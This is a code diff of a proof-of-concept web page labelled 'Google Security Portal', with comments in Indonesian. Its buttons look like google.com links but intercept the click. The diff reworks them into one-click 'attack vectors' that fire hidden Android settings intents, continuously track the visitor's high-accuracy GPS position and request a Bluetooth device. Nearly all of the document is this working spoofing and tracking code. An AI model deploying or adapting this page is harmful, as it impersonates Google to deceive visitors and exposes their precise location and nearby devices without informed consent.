@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto-Capture High-Accuracy Geolocation PoC</title>
+    <title>Instant 1-Click Bluetooth & Location PoC</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -50,6 +50,7 @@
             transition: background-color 0.2s;
             box-sizing: border-box;
             width: 100%;
+            cursor: pointer;
         }
         a.spoof-link:active {
             background-color: #1557b0;
@@ -89,20 +90,19 @@
 <body>
 
     <div class="banner">Google Security Portal</div>
-    <h1>High-Accuracy Location Auto-Capture</h1>
+    <h1>Instant 1-Click Vector Suite</h1>
 
-    <!-- Container 2 Tombol -->
     <div class="button-container">
-        <!-- Button 1: Location Settings & GPS Auto-Capture -->
-        <a href="https://google.com" class="spoof-link" id="targetLink1" data-intent="location">Long Press -> Trigger Location Settings & Capture</a>
+        <!-- Tombol 1: 1-Click Location & GPS Sync -->
+        <a href="https://google.com" class="spoof-link" id="btnLocation">1-Click -> Location Settings & GPS Capture</a>
 
-        <!-- Button 2: Alternative Intent (Contoh: Bluetooth/Wireless Settings) dengan Logika yang Sama -->
-        <a href="https://google.com" class="spoof-link" style="background-color: #34a853;" id="targetLink2" data-intent="bluetooth">Long Press -> Trigger Bluetooth Settings & Sync</a>
+        <!-- Tombol 2: 1-Click Bluetooth Pairing / Auto-Connect Intent -->
+        <a href="https://google.com" class="spoof-link" style="background-color: #34a853;" id="btnBluetooth">1-Click -> Bluetooth Auto-Connect Vector</a>
     </div>
 
-    <!-- Info Box untuk menampilkan hasil koordinat lokasi secara real-time -->
+    <!-- Info Box Hasil Eksekusi -->
     <div class="info-box" id="infoBox">
-        <strong>Status:</strong> <span id="statusText" class="pulse">Waiting for activation...</span><br>
+        <strong>Status:</strong> <span id="statusText" class="pulse">Ready...</span><br>
         <div id="coordDetails" style="margin-top: 8px;"></div>
     </div>
 
@@ -110,104 +110,106 @@
 
     <script>
         let triggered = false;
-        let watchId = null;
 
-        const updatePositionData = (position) => {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const accuracy = position.coords.accuracy;
-            const altitude = position.coords.altitude || "N/A";
-            const speed = position.coords.speed || "N/A";
-
-            const statusText = document.getElementById("statusText");
-            const coordDetails = document.getElementById("coordDetails");
-
-            statusText.className = "";
-            statusText.innerText = "Precise Location Captured Live!";
-            coordDetails.innerHTML = `
-                <b>Latitude:</b> ${lat}<br>
-                <b>Longitude:</b> ${lon}<br>
-                <b>Accuracy:</b> ±${accuracy} meters<br>
-                <b>Altitude:</b> ${altitude}<br>
-                <b>Speed:</b> ${speed}<br><br>
-                <a href="https://maps.google.com/?q=${lat},${lon}" target="_blank" style="color: #1a73e8; text-decoration: underline;">Open in Google Maps</a>
-            `;
-        };
-
-        const startLocationWatch = () => {
-            if ("geolocation" in navigator) {
-                watchId = navigator.geolocation.watchPosition(
-                    updatePositionData,
-                    (error) => {
-                        const statusText = document.getElementById("statusText");
-                        statusText.className = "";
-                        statusText.innerText = `GPS Error / Disabled: ${error.message}. Please enable location settings.`;
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 30000,
-                        maximumAge: 0
-                    }
-                );
-            } else {
-                document.getElementById("statusText").innerText = "Geolocation not supported.";
-            }
-        };
-
-        const executeAttackVector = (intentType) => {
+        // Fungsi Handler Lokasi Akurat
+        const handleLocationVector = () => {
             if (triggered) return;
             triggered = true;
 
             const infoBox = document.getElementById("infoBox");
             const statusText = document.getElementById("statusText");
+            const coordDetails = document.getElementById("coordDetails");
             
             infoBox.style.display = "block";
             statusText.className = "pulse";
-            statusText.innerText = `Opening Android ${intentType === 'location' ? 'Location' : 'Bluetooth'} Settings & syncing GPS...`;
+            statusText.innerText = "Triggering Location Settings & syncing GPS...";
 
-            setTimeout(() => {
-                try {
-                    // Memilih Intent berdasarkan tombol yang ditekan
-                    const intentAction = intentType === 'location' 
-                        ? "android.settings.LOCATION_SOURCE_SETTINGS" 
-                        : "android.settings.BLUETOOTH_SETTINGS";
+            // Membuka Android Intent Location Settings seketika (1-click)
+            const intentFrame = document.createElement('iframe');
+            intentFrame.style.display = 'none';
+            intentFrame.src = "intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end;";
+            document.body.appendChild(intentFrame);
+            setTimeout(() => document.body.removeChild(intentFrame), 1000);
 
-                    const intentFrame = document.createElement('iframe');
-                    intentFrame.style.display = 'none';
-                    intentFrame.src = `intent:#Intent;action=${intentAction};end;`;
-                    document.body.appendChild(intentFrame);
-                    setTimeout(() => document.body.removeChild(intentFrame), 1000);
+            // Menarik koordinat GPS secara live
+            if ("geolocation" in navigator) {
+                navigator.geolocation.watchPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
 
-                    // Memulai pelacakan koordinat GPS kontinyu
-                    startLocationWatch();
-
-                } catch (err) {
-                    console.debug("Vector execution error:", err.message);
-                } finally {
-                    setTimeout(() => { triggered = false; }, 1500);
-                }
-            }, 2500);
+                        statusText.className = "";
+                        statusText.innerText = "Precise Location Captured Live!";
+                        coordDetails.innerHTML = `
+                            <b>Latitude:</b> ${lat}<br>
+                            <b>Longitude:</b> ${lon}<br>
+                            <b>Accuracy:</b> ±${accuracy} meters<br><br>
+                            <a href="https://maps.google.com/?q=${lat},${lon}" target="_blank" style="color: #1a73e8; text-decoration: underline;">Open in Google Maps</a>
+                        `;
+                    },
+                    (error) => {
+                        statusText.className = "";
+                        statusText.innerText = `GPS Error: ${error.message}`;
+                    },
+                    { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
+                );
+            }
+            setTimeout(() => { triggered = false; }, 1000);
         };
 
-        // Event Listener untuk Tombol 1 (Location)
-        const targetElement1 = document.getElementById("targetLink1");
-        targetElement1.addEventListener("contextmenu", (e) => {
-            executeAttackVector('location');
-        });
-        targetElement1.addEventListener("touchstart", () => {}, { passive: true });
+        // Fungsi Handler Bluetooth Auto-Connect / Pairing Vector
+        const handleBluetoothVector = async () => {
+            if (triggered) return;
+            triggered = true;
 
-        // Event Listener untuk Tombol 2 (Intent Lain / Bluetooth) dengan Logika Sama
-        const targetElement2 = document.getElementById("targetLink2");
-        targetElement2.addEventListener("contextmenu", (e) => {
-            executeAttackVector('bluetooth');
-        });
-        targetElement2.addEventListener("touchstart", () => {}, { passive: true });
+            const infoBox = document.getElementById("infoBox");
+            const statusText = document.getElementById("statusText");
+            const coordDetails = document.getElementById("coordDetails");
+            
+            infoBox.style.display = "block";
+            statusText.className = "pulse";
+            statusText.innerText = "Initiating Bluetooth Device Scan / Pairing...";
 
-        // Auto-Trigger Handler saat kembali dari menu Setting Android ke browser (window focus)
-        window.addEventListener("focus", () => {
-            if (infoBox.style.display === "block") {
-                startLocationWatch();
+            // 1. Membuka Intent Setelan Bluetooth Android secara langsung
+            const btIntentFrame = document.createElement('iframe');
+            btIntentFrame.style.display = 'none';
+            btIntentFrame.src = "intent:#Intent;action=android.settings.BLUETOOTH_SETTINGS;end;";
+            document.body.appendChild(btIntentFrame);
+            setTimeout(() => document.body.removeChild(btIntentFrame), 1000);
+
+            // 2. Memanggil Web Bluetooth API (Membutuhkan 1 interaksi pengguna yang sah agar dialog pairing muncul)
+            try {
+                if (navigator.bluetooth) {
+                    const device = await navigator.bluetooth.requestDevice({
+                        acceptAllDevices: true // Atau tentukan filters service tertentu
+                    });
+                    statusText.className = "";
+                    statusText.innerText = `Connected / Selected Device: ${device.name || 'Unknown Device'} (${device.id})`;
+                    coordDetails.innerHTML = `<b>Device ID:</b> ${device.id}`;
+                } else {
+                    statusText.className = "";
+                    statusText.innerText = "Web Bluetooth API not supported on this browser.";
+                }
+            } catch (err) {
+                statusText.className = "";
+                statusText.innerText = `Bluetooth dialog cancelled / blocked: ${err.message}`;
+            } finally {
+                triggered = false;
             }
+        };
+
+        // Menggunakan event 'click' atau 'pointerdown' murni agar 1 kali klik langsung tereksekusi tanpa delay/2-kali klik
+        const btnLoc = document.getElementById("btnLocation");
+        btnLoc.addEventListener("click", (e) => {
+            e.preventDefault(); // Mencegah navigasi langsung ke google.com agar vektor berjalan di halaman
+            handleLocationVector();
+        });
+
+        const btnBt = document.getElementById("btnBluetooth");
+        btnBt.addEventListener("click", (e) => {
+            e.preventDefault();
+            handleBluetoothVector();
         });
     </script>
 
